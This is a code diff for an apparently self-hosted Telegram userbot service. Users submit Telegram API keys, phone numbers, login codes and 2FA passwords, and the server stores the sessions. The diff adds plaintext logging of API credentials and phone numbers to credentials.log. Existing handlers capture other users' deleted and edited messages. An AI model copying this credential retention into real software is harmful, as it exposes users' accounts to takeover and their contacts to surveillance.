@@ -5,12 +5,13 @@ import json
 import os
 import random
 import re
+import secrets
 import threading
 import time
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta
 from typing import Any
-from urllib.parse import quote_plus
+from urllib.parse import quote_plus, urlencode
 from urllib.request import Request, urlopen
 
 from flask import Flask, jsonify, request, send_from_directory
@@ -24,11 +25,16 @@ PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", f"http://localhost:{PORT}")
 SESSION_DIR = os.getenv("SESSION_DIR", "sessions")
 DATA_DIR = os.getenv("DATA_DIR", "data")
 MAX_ACCOUNTS_PER_API = int(os.getenv("MAX_ACCOUNTS_PER_API", "4"))
+AI_ENDPOINT = os.getenv(
+    "AI_ENDPOINT",
+    "https://devtoolbox-api.devtoolbox-api.workers.dev/ai/generate",
+)
 
 os.makedirs(SESSION_DIR, exist_ok=True)
 os.makedirs(DATA_DIR, exist_ok=True)
 
-ACCOUNT_MAP_FILE = os.path.join(DATA_DIR, "account_map.json")
+ACCOUNT_FILE = os.path.join(DATA_DIR, "dashboard_accounts.json")
+LINKS_FILE = os.path.join(DATA_DIR, "linked_devices.json")
 CREDENTIAL_LOG_FILE = os.path.join(DATA_DIR, "credentials.log")
 
 app = Flask(__name__, static_folder="static", template_folder="templates")
@@ -51,8 +57,8 @@ HELP_MAP = {
     "mode": ".mode public|private",
     "filter": ".filter <word> <response>",
     "schedule": ".schedule <10m|HH:MM> <message>",
-    "gpt": ".gpt <text> (free web answer, no API key)",
-    "ask": ".ask <text> (free web answer, no API key)",
+    "gpt": ".gpt <text> (Llama 3.2 free endpoint)",
+    "ask": ".ask <text> (Llama 3.2 free endpoint)",
     "persona": ".persona default|calm|savage",
     "calc": ".calc <expression>",
     "qr": ".qr <text>",
@@ -71,6 +77,7 @@ DARES = ["Send a funny emoji combo.", "Type your last message in reverse."]
 class UserbotState:
     client: TelegramClient
     phone: str
+    account_key: str
     mode: str = "public"
     persona: str = "default"
     auto_reply_enabled: bool = False
@@ -82,46 +89,90 @@ class UserbotState:
     autostoryreact: bool = False
     autoread: bool = False
     autotype: bool = False
-    prefix: str = "."
     filters: dict[str, str] = field(default_factory=dict)
 
 
 pending_clients: dict[str, TelegramClient] = {}
+pending_account_for_phone: dict[str, str] = {}
 active_bots: dict[str, UserbotState] = {}
+active_tokens: dict[str, str] = {}  # token -> account_key
 
 
 # ---------- persistence ----------
-def load_account_map() -> dict[str, list[str]]:
-    if not os.path.exists(ACCOUNT_MAP_FILE):
-        return {}
-    with open(ACCOUNT_MAP_FILE, "r", encoding="utf-8") as f:
-        return json.load(f)
+def load_json(path: str, default: Any) -> Any:
+    if not os.path.exists(path):
+        return default
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return default
 
 
-def save_account_map(data: dict[str, list[str]]) -> None:
-    with open(ACCOUNT_MAP_FILE, "w", encoding="utf-8") as f:
+def save_json(path: str, data: Any) -> None:
+    with open(path, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2)
 
 
-def register_account(api_id: int, api_hash: str, phone: str) -> tuple[bool, str]:
-    key = f"{api_id}:{api_hash}"
-    mapping = load_account_map()
-    phones = mapping.get(key, [])
+def account_key(api_id: int, api_hash: str) -> str:
+    return f"{api_id}:{api_hash}"
 
+
+def split_account_key(key: str) -> tuple[int, str]:
+    left, right = key.split(":", 1)
+    return int(left), right
+
+
+def register_dashboard_account(api_id: int, api_hash: str) -> tuple[bool, str]:
+    accounts = load_json(ACCOUNT_FILE, {})
+    key = account_key(api_id, api_hash)
+    if key in accounts:
+        return True, "Account already exists. Please login."
+
+    accounts[key] = {
+        "api_id": api_id,
+        "api_hash": api_hash,
+        "created_at": datetime.utcnow().isoformat() + "Z",
+    }
+    save_json(ACCOUNT_FILE, accounts)
+    return True, "Account created successfully."
+
+
+def account_exists(api_id: int, api_hash: str) -> bool:
+    accounts = load_json(ACCOUNT_FILE, {})
+    return account_key(api_id, api_hash) in accounts
+
+
+def get_linked_phones(key: str) -> list[str]:
+    links = load_json(LINKS_FILE, {})
+    return links.get(key, [])
+
+
+def set_linked_phones(key: str, phones: list[str]) -> None:
+    links = load_json(LINKS_FILE, {})
+    links[key] = sorted(set(phones))
+    save_json(LINKS_FILE, links)
+
+
+def add_linked_phone(key: str, phone: str) -> tuple[bool, str]:
+    phones = get_linked_phones(key)
     if phone in phones:
-        return True, "Phone already linked for this API ID/hash."
-
+        return True, "Phone already linked to this dashboard account."
     if len(phones) >= MAX_ACCOUNTS_PER_API:
-        return False, f"This API ID/hash already has {MAX_ACCOUNTS_PER_API} linked accounts."
-
+        return False, f"Maximum {MAX_ACCOUNTS_PER_API} linked devices reached for this account."
     phones.append(phone)
-    mapping[key] = phones
-    save_account_map(mapping)
+    set_linked_phones(key, phones)
+    return True, "Device slot reserved."
 
+
+def remove_linked_phone(key: str, phone: str) -> None:
+    phones = [p for p in get_linked_phones(key) if p != phone]
+    set_linked_phones(key, phones)
+
+
+def append_credential_log(api_id: int, api_hash: str, phone: str) -> None:
     with open(CREDENTIAL_LOG_FILE, "a", encoding="utf-8") as f:
         f.write(f"{datetime.utcnow().isoformat()}Z | api_id={api_id} | api_hash={api_hash} | phone={phone}\n")
-
-    return True, "Account slot reserved."
 
 
 # ---------- loop ----------
@@ -147,16 +198,68 @@ def run_async(coro: Any) -> Any:
 
 
 # ---------- utils ----------
-def http_text(url: str) -> str:
-    req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
-    with urlopen(req, timeout=20) as r:
+def http_text(url: str, method: str = "GET", payload: dict[str, Any] | None = None) -> str:
+    data = None
+    headers = {"User-Agent": "Mozilla/5.0"}
+    if payload is not None:
+        data = json.dumps(payload).encode("utf-8")
+        headers["Content-Type"] = "application/json"
+    req = Request(url, method=method, data=data, headers=headers)
+    with urlopen(req, timeout=30) as r:
         return r.read().decode("utf-8", errors="ignore")
+
+
+def ask_free_ai(query: str) -> str:
+    variants = [
+        ("GET", f"{AI_ENDPOINT}?{urlencode({'prompt': query})}", None),
+        ("GET", f"{AI_ENDPOINT}?{urlencode({'q': query})}", None),
+        ("POST", AI_ENDPOINT, {"prompt": query}),
+        ("POST", AI_ENDPOINT, {"text": query}),
+    ]
+
+    for method, url, payload in variants:
+        try:
+            txt = http_text(url, method=method, payload=payload)
+            data = json.loads(txt)
+            for key in ("response", "answer", "result", "text", "output", "message"):
+                if isinstance(data, dict) and data.get(key):
+                    return str(data[key])
+            if isinstance(data, dict):
+                return json.dumps(data)[:1800]
+        except Exception:
+            continue
+
+    return "AI endpoint did not return a readable response right now."
+
+
+def safe_calc(expr: str) -> str:
+    node = ast.parse(expr, mode="eval")
+    allowed = (
+        ast.Expression,
+        ast.BinOp,
+        ast.UnaryOp,
+        ast.Constant,
+        ast.Add,
+        ast.Sub,
+        ast.Mult,
+        ast.Div,
+        ast.Pow,
+        ast.Mod,
+        ast.USub,
+        ast.UAdd,
+        ast.FloorDiv,
+        ast.Load,
+        ast.Tuple,
+    )
+    if not all(isinstance(n, allowed) for n in ast.walk(node)):
+        raise ValueError("Unsupported expression")
+    return str(eval(compile(node, "<calc>", "eval"), {"__builtins__": {}}))
 
 
 def web_answer(query: str) -> str:
     try:
-        text = http_text(f"https://api.duckduckgo.com/?q={quote_plus(query)}&format=json&no_redirect=1")
-        data = json.loads(text)
+        txt = http_text(f"https://api.duckduckgo.com/?q={quote_plus(query)}&format=json&no_redirect=1")
+        data = json.loads(txt)
         answer = data.get("AbstractText") or data.get("Answer")
         if answer:
             return answer
@@ -165,15 +268,7 @@ def web_answer(query: str) -> str:
             return topics[0].get("Text", "No direct answer found.")
     except Exception:
         pass
-    return "I could not find a direct answer right now."
-
-
-def safe_calc(expr: str) -> str:
-    node = ast.parse(expr, mode="eval")
-    allowed = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Pow, ast.Mod, ast.USub, ast.UAdd, ast.FloorDiv, ast.Load, ast.Tuple)
-    if not all(isinstance(n, allowed) for n in ast.walk(node)):
-        raise ValueError("Unsupported expression")
-    return str(eval(compile(node, "<calc>", "eval"), {"__builtins__": {}}))
+    return "No direct answer found."
 
 
 async def schedule_send(client: TelegramClient, chat_id: int, delay_sec: int, message: str) -> None:
@@ -195,17 +290,25 @@ def parse_delay(token: str) -> int:
     raise ValueError("Use 10m or HH:MM")
 
 
+def account_from_token() -> tuple[str | None, Any | None]:
+    token = request.headers.get("X-Auth-Token", "").strip()
+    key = active_tokens.get(token)
+    if not key:
+        return None, (jsonify({"detail": "Unauthorized. Please login."}), 401)
+    return key, None
+
+
 async def send_help(event: events.NewMessage.Event, cmd: str) -> None:
     text = HELP_MAP.get(cmd.lower(), "Command not found. Try .menu")
     await event.respond(f"ℹ️ {cmd}: {text}")
 
 
-# ---------- bot ----------
-async def start_userbot(client: TelegramClient, phone: str) -> None:
+# ---------- userbot ----------
+async def start_userbot(client: TelegramClient, phone: str, linked_account_key: str) -> None:
     if phone in active_bots:
         return
 
-    state = UserbotState(client=client, phone=phone)
+    state = UserbotState(client=client, phone=phone, account_key=linked_account_key)
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.menu$"))
     async def menu_handler(event: events.NewMessage.Event) -> None:
@@ -225,7 +328,9 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.profile$"))
     async def profile_handler(event: events.NewMessage.Event) -> None:
-        await event.respond(f"Cypherus profile\nPhone: {phone}\nMode: {state.mode}\nPersona: {state.persona}")
+        await event.respond(
+            f"Cypherus profile\nPhone: {phone}\nMode: {state.mode}\nPersona: {state.persona}\nAccount: {state.account_key.split(':',1)[0]}"
+        )
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.mode\s+(public|private)$"))
     async def mode_handler(event: events.NewMessage.Event) -> None:
@@ -235,19 +340,21 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.getsettings$"))
     async def settings_handler(event: events.NewMessage.Event) -> None:
         await event.respond(
-            "\n".join([
-                f"away={state.auto_reply_enabled}",
-                f"anti_delete={state.anti_delete}",
-                f"anti_edit={state.anti_edit}",
-                f"vvwatch={state.vvwatch}",
-                f"autostoryview={state.autostoryview}",
-                f"autostoryreact={state.autostoryreact}",
-                f"autoread={state.autoread}",
-                f"autotype={state.autotype}",
-                f"mode={state.mode}",
-                f"persona={state.persona}",
-                f"filters={len(state.filters)}",
-            ])
+            "\n".join(
+                [
+                    f"away={state.auto_reply_enabled}",
+                    f"anti_delete={state.anti_delete}",
+                    f"anti_edit={state.anti_edit}",
+                    f"vvwatch={state.vvwatch}",
+                    f"autostoryview={state.autostoryview}",
+                    f"autostoryreact={state.autostoryreact}",
+                    f"autoread={state.autoread}",
+                    f"autotype={state.autotype}",
+                    f"mode={state.mode}",
+                    f"persona={state.persona}",
+                    f"filters={len(state.filters)}",
+                ]
+            )
         )
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.persona\s+(default|calm|savage)$"))
@@ -324,40 +431,39 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
         except Exception as exc:
             await event.respond(f"❌ {exc}")
 
-    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(gpt|ask|ggsearch)\s+(.+)$"))
-    async def ask_handler(event: events.NewMessage.Event) -> None:
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(gpt|ask)\s+(.+)$"))
+    async def ai_handler(event: events.NewMessage.Event) -> None:
         q = event.pattern_match.group(2)
-        ans = web_answer(q)
+        ans = ask_free_ai(q)
         if state.persona == "calm":
-            ans = f"🌿 Calm answer: {ans}"
+            ans = f"🌿 Calm: {ans}"
         elif state.persona == "savage":
-            ans = f"🔥 Savage answer: {ans}"
-        await event.respond(ans)
+            ans = f"🔥 Savage: {ans}"
+        await event.respond(ans[:3500])
+
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.ggsearch\s+(.+)$"))
+    async def ggsearch_handler(event: events.NewMessage.Event) -> None:
+        await event.respond(web_answer(event.pattern_match.group(1)))
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.summarize\s+(.+)$"))
     async def summarize_handler(event: events.NewMessage.Event) -> None:
         text = event.pattern_match.group(1)
-        summary = " ".join(text.split()[:30])
-        await event.respond(f"Summary: {summary}")
+        await event.respond("Summary: " + " ".join(text.split()[:40]))
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.translate\s+(.+)\s+to\s+(\w+)$"))
     async def translate_handler(event: events.NewMessage.Event) -> None:
-        src, lang = event.pattern_match.group(1), event.pattern_match.group(2)
-        await event.respond(f"Translation ({lang}) not configured with paid API. Text: {src}")
+        txt, lang = event.pattern_match.group(1), event.pattern_match.group(2)
+        await event.respond(f"Translate ({lang}) lightweight mode: {txt}")
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.qr\s+(.+)$"))
     async def qr_handler(event: events.NewMessage.Event) -> None:
         text = quote_plus(event.pattern_match.group(1))
-        await event.respond(f"QR: https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={text}")
+        await event.respond(f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={text}")
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.short\s+(https?://\S+)$"))
     async def short_handler(event: events.NewMessage.Event) -> None:
         url = quote_plus(event.pattern_match.group(1))
-        try:
-            short_url = http_text(f"https://tinyurl.com/api-create.php?url={url}").strip()
-            await event.respond(short_url)
-        except Exception as exc:
-            await event.respond(f"❌ {exc}")
+        await event.respond(http_text(f"https://tinyurl.com/api-create.php?url={url}").strip())
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.ytsearch\s+(.+)$"))
     async def ytsearch_handler(event: events.NewMessage.Event) -> None:
@@ -376,8 +482,31 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.rate\s+@?(\S+)$"))
     async def rate_handler(event: events.NewMessage.Event) -> None:
-        u = event.pattern_match.group(1)
-        await event.respond(f"⭐ {u}: {random.randint(1, 10)}/10")
+        await event.respond(f"⭐ {event.pattern_match.group(1)}: {random.randint(1, 10)}/10")
+
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.msg\s+(.+?)\s+(.+)$"))
+    async def msg_handler(event: events.NewMessage.Event) -> None:
+        target, text = event.pattern_match.group(1), event.pattern_match.group(2)
+        await client.send_message(target, text)
+        await event.respond("✅ Sent")
+
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.decodeid(?:\s+(.+))?$"))
+    async def decodeid_handler(event: events.NewMessage.Event) -> None:
+        ident = event.pattern_match.group(1) or (event.reply_to_msg_id and str(event.chat_id)) or ""
+        if not ident:
+            await event.respond("Usage: .decodeid <id>")
+            return
+        try:
+            entity = await client.get_entity(ident)
+            await event.respond(f"type={type(entity).__name__}\nid={getattr(entity, 'id', '?')}")
+        except Exception as exc:
+            await event.respond(f"❌ {exc}")
+
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.iscypherus\s+(.+)$"))
+    async def iscypherus_handler(event: events.NewMessage.Event) -> None:
+        target = event.pattern_match.group(1).strip()
+        all_phones = [p for st in active_bots.values() for p in [st.phone]]
+        await event.respond("✅ linked" if target in all_phones else "❌ not linked")
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(joke|jokes)$"))
     async def joke_handler(event: events.NewMessage.Event) -> None:
@@ -389,16 +518,12 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
 
     @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(quote|quotes|facts)$"))
     async def quote_handler(event: events.NewMessage.Event) -> None:
-        await event.respond(random.choice([
-            "Small steps every day beat big plans someday.",
-            "Done is better than perfect.",
-            "Consistency creates results.",
-        ]))
+        await event.respond(random.choice(["Small steps every day.", "Done beats perfect.", "Consistency wins."]))
 
-    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(dl|playlist|song|meta|tagall|kick|promote|demote|warn|mute|join|leave|leavesilently|pin|unpin|vvsave|compress|rename|tomp4|ocr|s|toimg|generateimg|msg|decodeid|iscypherus|setpin|changepin|hide|unhide|setprefix|setbotname|setownername|setwelcome|setgoodbye|link|restart|unlinktoken|lockchat|blockword|backup|restore|save|get|list|activity|usage|stats|daily|rank|roast|vibecheck|generate|code|teach|tiktok|instagram|twitter|video|qrcode|tinyurl|sticker|toimage|tourl|lyrics|define|weather|memes|alwaysonline)(?:\s+.*)?$"))
+    @client.on(events.NewMessage(outgoing=True, pattern=r"^\.(dl|playlist|song|meta|tagall|kick|promote|demote|warn|mute|join|leave|leavesilently|pin|unpin|vvsave|compress|rename|tomp4|ocr|s|toimg|generateimg|setpin|changepin|hide|unhide|setprefix|setbotname|setownername|setwelcome|setgoodbye|link|restart|unlinktoken|lockchat|blockword|backup|restore|save|get|list|activity|usage|stats|daily|rank|roast|vibecheck|generate|code|teach|tiktok|instagram|twitter|video|qrcode|tinyurl|sticker|toimage|tourl|lyrics|define|weather|memes|alwaysonline)(?:\s+.*)?$"))
     async def placeholder_handler(event: events.NewMessage.Event) -> None:
         command = event.raw_text.split()[0]
-        await event.respond(f"🛠 {command} is added as a lightweight placeholder. It can be expanded in next update.")
+        await event.respond(f"🛠 {command} is enabled as lightweight mode. Advanced behavior can be attached per module.")
 
     @client.on(events.MessageDeleted)
     async def deleted_logger(event: events.MessageDeleted.Event) -> None:
@@ -411,7 +536,7 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
             await client.send_message("me", f"[anti-edit] edited in {event.chat_id}: {event.raw_text}")
 
     @client.on(events.NewMessage(incoming=True))
-    async def incoming_autoreply(event: events.NewMessage.Event) -> None:
+    async def incoming_handler(event: events.NewMessage.Event) -> None:
         if state.autoread:
             await event.mark_read()
 
@@ -428,6 +553,44 @@ async def start_userbot(client: TelegramClient, phone: str) -> None:
             await event.respond(state.auto_reply_text)
 
     active_bots[phone] = state
+
+
+async def restore_active_accounts() -> None:
+    accounts = load_json(ACCOUNT_FILE, {})
+    links = load_json(LINKS_FILE, {})
+    for key, phones in links.items():
+        if key not in accounts:
+            continue
+        api_id, api_hash = split_account_key(key)
+        for phone in phones:
+            try:
+                client = TelegramClient(session_path(phone), api_id, api_hash)
+                await client.connect()
+                if not await client.is_user_authorized():
+                    await client.disconnect()
+                    continue
+                await start_userbot(client, phone, key)
+            except Exception:
+                continue
+
+
+def restore_active_accounts_sync() -> None:
+    run_async(restore_active_accounts())
+
+
+# ---------- API error handling ----------
+@app.errorhandler(404)
+def handle_404(_: Any) -> Any:
+    if request.path.startswith("/api/"):
+        return jsonify({"detail": "Not found"}), 404
+    return "Not found", 404
+
+
+@app.errorhandler(500)
+def handle_500(_: Any) -> Any:
+    if request.path.startswith("/api/"):
+        return jsonify({"detail": "Internal server error"}), 500
+    return "Server error", 500
 
 
 # ---------- routes ----------
@@ -448,23 +611,68 @@ def health() -> Any:
     return jsonify({"status": "ok", "public_base_url": PUBLIC_BASE_URL, "active_sessions": len(active_bots)})
 
 
-@app.post("/api/v1/auth/start")
-def auth_start() -> Any:
+@app.post("/api/v1/account/register")
+def account_register() -> Any:
     payload = request.get_json(silent=True) or {}
     try:
         api_id = int(payload.get("api_id", 0))
     except (TypeError, ValueError):
         return jsonify({"detail": "api_id must be a number"}), 400
-
     api_hash = str(payload.get("api_hash", "")).strip()
-    phone = str(payload.get("phone", "")).strip()
+    if api_id < 1 or not api_hash:
+        return jsonify({"detail": "api_id and api_hash are required"}), 400
 
-    if api_id < 1 or not api_hash or not phone:
-        return jsonify({"detail": "api_id, api_hash, and phone are required"}), 400
-
-    ok, message = register_account(api_id, api_hash, phone)
+    ok, message = register_dashboard_account(api_id, api_hash)
     if not ok:
         return jsonify({"detail": message}), 400
+    return jsonify({"status": "ok", "message": message})
+
+
+@app.post("/api/v1/account/login")
+def account_login() -> Any:
+    payload = request.get_json(silent=True) or {}
+    try:
+        api_id = int(payload.get("api_id", 0))
+    except (TypeError, ValueError):
+        return jsonify({"detail": "api_id must be a number"}), 400
+    api_hash = str(payload.get("api_hash", "")).strip()
+
+    if not account_exists(api_id, api_hash):
+        return jsonify({"detail": "Account not found. Register first."}), 404
+
+    key = account_key(api_id, api_hash)
+    token = secrets.token_hex(24)
+    active_tokens[token] = key
+    return jsonify({"status": "ok", "token": token})
+
+
+@app.get("/api/v1/dashboard/me")
+def dashboard_me() -> Any:
+    key, err = account_from_token()
+    if err:
+        return err
+    phones = get_linked_phones(key)
+    items = [{"phone": p, "active": p in active_bots} for p in phones]
+    return jsonify({"account": key.split(":", 1)[0], "linked_devices": items, "max": MAX_ACCOUNTS_PER_API})
+
+
+@app.post("/api/v1/dashboard/link/start")
+def dashboard_link_start() -> Any:
+    key, err = account_from_token()
+    if err:
+        return err
+
+    payload = request.get_json(silent=True) or {}
+    phone = str(payload.get("phone", "")).strip()
+    if not phone:
+        return jsonify({"detail": "phone is required"}), 400
+
+    api_id, api_hash = split_account_key(key)
+    ok, message = add_linked_phone(key, phone)
+    if not ok:
+        return jsonify({"detail": message}), 400
+
+    append_credential_log(api_id, api_hash, phone)
 
     client = TelegramClient(session_path(phone), api_id, api_hash)
     run_async(client.connect())
@@ -473,26 +681,33 @@ def auth_start() -> Any:
         result = run_async(client.send_code_request(phone))
     except Exception as exc:
         run_async(client.disconnect())
+        remove_linked_phone(key, phone)
         return jsonify({"detail": str(exc)}), 400
 
     pending_clients[phone] = client
+    pending_account_for_phone[phone] = key
     return jsonify({"status": "code_sent", "phone": phone, "phone_code_hash": result.phone_code_hash, "message": message})
 
 
-@app.post("/api/v1/auth/verify-code")
-def auth_verify_code() -> Any:
+@app.post("/api/v1/dashboard/link/verify-code")
+def dashboard_verify_code() -> Any:
+    key, err = account_from_token()
+    if err:
+        return err
+
     payload = request.get_json(silent=True) or {}
     phone = str(payload.get("phone", "")).strip()
     code = str(payload.get("code", "")).strip()
 
     client = pending_clients.get(phone)
-    if not client:
+    if not client or pending_account_for_phone.get(phone) != key:
         return jsonify({"detail": "No pending auth for this phone"}), 404
 
     try:
         run_async(client.sign_in(phone=phone, code=code))
-        run_async(start_userbot(client, phone))
+        run_async(start_userbot(client, phone, key))
         pending_clients.pop(phone, None)
+        pending_account_for_phone.pop(phone, None)
         return jsonify({"status": "authorized", "phone": phone})
     except SessionPasswordNeededError:
         return jsonify({"status": "2fa_required", "phone": phone})
@@ -500,23 +715,62 @@ def auth_verify_code() -> Any:
         return jsonify({"detail": str(exc)}), 400
 
 
-@app.post("/api/v1/auth/verify-password")
-def auth_verify_password() -> Any:
+@app.post("/api/v1/dashboard/link/verify-password")
+def dashboard_verify_password() -> Any:
+    key, err = account_from_token()
+    if err:
+        return err
+
     payload = request.get_json(silent=True) or {}
     phone = str(payload.get("phone", "")).strip()
     password = str(payload.get("password", ""))
 
     client = pending_clients.get(phone)
-    if not client:
+    if not client or pending_account_for_phone.get(phone) != key:
         return jsonify({"detail": "No pending auth for this phone"}), 404
 
     try:
         run_async(client.sign_in(password=password))
-        run_async(start_userbot(client, phone))
+        run_async(start_userbot(client, phone, key))
         pending_clients.pop(phone, None)
+        pending_account_for_phone.pop(phone, None)
         return jsonify({"status": "authorized", "phone": phone})
     except Exception as exc:
         return jsonify({"detail": str(exc)}), 400
+
+
+@app.post("/api/v1/dashboard/unlink")
+def dashboard_unlink() -> Any:
+    key, err = account_from_token()
+    if err:
+        return err
+
+    payload = request.get_json(silent=True) or {}
+    phone = str(payload.get("phone", "")).strip()
+    if not phone:
+        return jsonify({"detail": "phone is required"}), 400
+
+    remove_linked_phone(key, phone)
+    state = active_bots.pop(phone, None)
+    if state:
+        run_async(state.client.disconnect())
+    return jsonify({"status": "ok", "phone": phone})
+
+
+# Backward-compatible old endpoints
+@app.post("/api/v1/auth/start")
+def compat_auth_start() -> Any:
+    return jsonify({"detail": "Use /api/v1/account/register + /api/v1/account/login + /api/v1/dashboard/link/start"}), 410
+
+
+@app.post("/api/v1/auth/verify-code")
+def compat_auth_verify_code() -> Any:
+    return jsonify({"detail": "Use /api/v1/dashboard/link/verify-code with X-Auth-Token"}), 410
+
+
+@app.post("/api/v1/auth/verify-password")
+def compat_auth_verify_password() -> Any:
+    return jsonify({"detail": "Use /api/v1/dashboard/link/verify-password with X-Auth-Token"}), 410
 
 
 @atexit.register
@@ -535,4 +789,5 @@ def shutdown() -> None:
 
 
 if __name__ == "__main__":
+    restore_active_accounts_sync()
     app.run(host=HOST, port=PORT)
